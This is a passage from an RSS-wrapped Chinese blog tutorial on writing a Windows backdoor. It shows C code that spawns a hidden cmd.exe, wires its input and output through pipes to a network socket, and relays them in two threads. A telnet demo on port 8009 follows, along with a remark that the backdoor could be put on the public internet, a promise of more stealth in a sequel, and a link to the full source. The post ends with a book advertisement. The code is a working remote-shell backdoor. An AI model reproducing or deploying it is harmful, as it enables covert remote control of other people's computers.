&lt;/span&gt;&lt;span&gt;18&lt;/span&gt;     GetStartupInfo(&amp;amp;&lt;span&gt;si);
&lt;/span&gt;&lt;span&gt;19&lt;/span&gt;     si.dwFlags = STARTF_USESHOWWINDOW |&lt;span&gt; STARTF_USESTDHANDLES;
&lt;/span&gt;&lt;span&gt;20&lt;/span&gt;     &lt;span&gt;//&lt;/span&gt;&lt;span&gt;cmd的标准输入连接到管道1的读取端&lt;/span&gt;
&lt;span&gt;21&lt;/span&gt;     si.hStdInput =&lt;span&gt; hReadPipe1;
&lt;/span&gt;&lt;span&gt;22&lt;/span&gt;     &lt;span&gt;//&lt;/span&gt;&lt;span&gt;cmd的标准输出连接到管道2的写入端&lt;/span&gt;
&lt;span&gt;23&lt;/span&gt;     si.hStdOutput = si.hStdError =&lt;span&gt; hWritePipe2;
&lt;/span&gt;&lt;span&gt;24&lt;/span&gt;     &lt;span&gt;//&lt;/span&gt;&lt;span&gt;将窗口设置为隐藏&lt;/span&gt;
&lt;span&gt;25&lt;/span&gt;     si.wShowWindow =&lt;span&gt; SW_HIDE;
&lt;/span&gt;&lt;span&gt;26&lt;/span&gt;     &lt;span&gt;//&lt;/span&gt;&lt;span&gt;获取cmd.exe的系统路径&lt;/span&gt;
&lt;span&gt;27&lt;/span&gt;     TCHAR tCmdPath[MAX_PATH] = { &lt;span&gt;0&lt;/span&gt;&lt;span&gt; };
&lt;/span&gt;&lt;span&gt;28&lt;/span&gt;     GetSystemDirectory(tCmdPath, MAX_PATH);&lt;span&gt;//&lt;/span&gt;&lt;span&gt;获取系统路径&lt;/span&gt;
&lt;span&gt;29&lt;/span&gt;     lstrcat(tCmdPath, TEXT(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;\\cmd.exe&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;));
&lt;/span&gt;&lt;span&gt;30&lt;/span&gt;     &lt;span&gt;//&lt;/span&gt;&lt;span&gt;wcscat_s(tCmdPath, MAX_PATH, TEXT(&quot;\\cmd.exe&quot;));
&lt;/span&gt;&lt;span&gt;31&lt;/span&gt;     &lt;span&gt;//&lt;/span&gt;&lt;span&gt;开始创建cmd进程&lt;/span&gt;
&lt;span&gt;32&lt;/span&gt;     PROCESS_INFORMATION pi = { &lt;span&gt;0&lt;/span&gt;&lt;span&gt; };
&lt;/span&gt;&lt;span&gt;33&lt;/span&gt;     &lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;CreateProcess(tCmdPath,
&lt;/span&gt;&lt;span&gt;34&lt;/span&gt;         NULL, NULL, NULL, TRUE, &lt;span&gt;0&lt;/span&gt;, NULL, NULL, &amp;amp;si, &amp;amp;&lt;span&gt;pi))
&lt;/span&gt;&lt;span&gt;35&lt;/span&gt;         &lt;span&gt;return&lt;/span&gt; FALSE;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;　　1.3.为了方便操作，我在后门程序中开启了两个线程，分别处理socket和管道的读写操作，部分代码如下：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;52&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt;     &lt;span&gt;//&lt;/span&gt;&lt;span&gt;下面开始启动两个线程，一个是读线程,从socket读取数据写入管道1，一个是写线程，从管道2读取数据，写到socket&lt;/span&gt;
&lt;span&gt; 2&lt;/span&gt; &lt;span&gt;    ComNode mReadNode, mWriteNode;
&lt;/span&gt;&lt;span&gt; 3&lt;/span&gt;     mReadNode.socket = mWriteNode.socket =&lt;span&gt; cSocket;
&lt;/span&gt;&lt;span&gt; 4&lt;/span&gt;     mReadNode.pipe =&lt;span&gt; hWritePipe1;
&lt;/span&gt;&lt;span&gt; 5&lt;/span&gt;     mWriteNode.pipe =&lt;span&gt; hReadPipe2;
&lt;/span&gt;&lt;span&gt; 6&lt;/span&gt;     &lt;span&gt;//&lt;/span&gt;&lt;span&gt;接下来启动线程，并将两个通信节点作为参数传到线程处理函数中&lt;/span&gt;
&lt;span&gt; 7&lt;/span&gt;     DWORD dwThreadOutput=&lt;span&gt;0&lt;/span&gt;, dwThreadInput=&lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt; 8&lt;/span&gt;     HANDLE hThreadInput = CreateThread(NULL, &lt;span&gt;0&lt;/span&gt;, ThreadInput, &amp;amp;mReadNode, &lt;span&gt;0&lt;/span&gt;, &amp;amp;&lt;span&gt;dwThreadInput);
&lt;/span&gt;&lt;span&gt; 9&lt;/span&gt;     HANDLE hThreadOutput = CreateThread(NULL, &lt;span&gt;0&lt;/span&gt;, ThreadOutput, &amp;amp;mWriteNode, &lt;span&gt;0&lt;/span&gt;, &amp;amp;&lt;span&gt;dwThreadOutput);
&lt;/span&gt;&lt;span&gt;10&lt;/span&gt;     
&lt;span&gt;11&lt;/span&gt; 
&lt;span&gt;12&lt;/span&gt;     HANDLE szHandles[] =&lt;span&gt; { hThreadOutput ,hThreadInput };
&lt;/span&gt;&lt;span&gt;13&lt;/span&gt;     &lt;span&gt;//&lt;/span&gt;&lt;span&gt;同步线程&lt;/span&gt;
&lt;span&gt;14&lt;/span&gt;     WaitForMultipleObjects(&lt;span&gt;2&lt;/span&gt;, szHandles, TRUE, INFINITE);
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;　　1.4最后看一下运行效果，首先我们在本地启动后门程序，监听8009端口，然后在本地使用telnet连接后门程序，模拟黑客攻击的过程，当然你完全可以将后门程序放到公网中，这里只是方便演示。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/899843/201710/899843-20171031124213933-976480630.png&quot; alt=&quot;&quot; width=&quot;525&quot; height=&quot;343&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;这就是我们在E盘生成的后门程序，大家肯定会想，如果去掉这个黑窗口，不然不够隐蔽，大家先百度，很简单，在下一篇后门编程(2)我会讲一下。接着我在本地启动一个cmd.exe，也就是黑客端，不要和后门程序中启动的cmd.exe弄混了。在其中输入telnet命令，连接后门程序。下图是连接后门之前的cmd.exe的情况。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/899843/201710/899843-20171031124736386-478314686.png&quot; alt=&quot;&quot; width=&quot;538&quot; height=&quot;351&quot;/&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt; &lt;span&gt;我们输入telnet 127.0.0.1 8009 后，开始发生变化。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;http://images2017.cnblogs.com/blog/899843/201710/899843-20171031124902152-1000556376.png&quot; alt=&quot;&quot; width=&quot;578&quot; height=&quot;377&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/899843/201710/899843-20171031124942636-1243634760.png&quot; alt=&quot;&quot; width=&quot;593&quot; height=&quot;401&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;路径切换到后门所在的地方了，我们也就是说我们可以在本机远程操作服务器上的shell了，执行dir命令，查看服务器上的文件。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;http://images2017.cnblogs.com/blog/899843/201710/899843-20171031125158433-745267175.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;完整的代码我放到 https://github.com/qiyeboy/LuLunZi 中的BackDoor文件夹中。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;http://images2017.cnblogs.com/blog/899843/201710/899843-20171031125720527-201552424.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h2 align=&quot;left&quot;&gt;二.再续&lt;/h2&gt;
&lt;p&gt;　　&lt;span&gt;我新书&lt;strong&gt;&lt;a href=&quot;https://search.jd.com/Search?keyword=python%E7%88%AC%E8%99%AB%E5%BC%80%E5%8F%91%E4%B8%8E%E9%A1%B9%E7%9B%AE%E5%AE%9E%E6%88%98&amp;amp;enc=utf-8&amp;amp;suggest=2.his.0.0&amp;amp;wq=&amp;amp;pvid=fc828a64ffab4ac88a341a813d09b27b&quot; target=&quot;_blank&quot;&gt;《Python爬虫开发与项目实战》&lt;/a&gt;&lt;/strong&gt;出版了。 这本书包括基础篇，中级篇和深入篇三个部分，不仅适合零基础的朋友入门，也适合有一定基础的爬虫爱好者进阶，如果&lt;strong&gt;你不会分布式爬虫，不会千万级数据的去重，不会怎么突破反爬虫，不会分析js的加密&lt;/strong&gt;，这本书会给你惊喜。如果大家对这本书感兴趣的话，可以看一下 &lt;strong&gt;&lt;a class=&quot; wrap external&quot; href=&quot;http://pan.baidu.com/s/1hrWEOYg&quot; target=&quot;_blank&quot;&gt;试读样章&lt;/a&gt;。&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;img src=&quot;http://images2015.cnblogs.com/blog/899843/201706/899843-20170625211654570-1480321772.png&quot; alt=&quot;&quot;/&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;欢迎大家光顾我公众号:&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;&lt;img src=&quot;http://images2015.cnblogs.com/blog/899843/201706/899843-20170625211707054-2019185395.png&quot; alt=&quot;&quot;/&gt;&lt;/strong&gt;&lt;/p&gt;

</description>
<pubDate>Tue, 31 Oct 2017 05:04:00 +0000</pubDate>
<dc:creator>七夜的故事</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/qiyeboy/p/7760950.html</dc:identifier>
</item>
</channel>
</rss>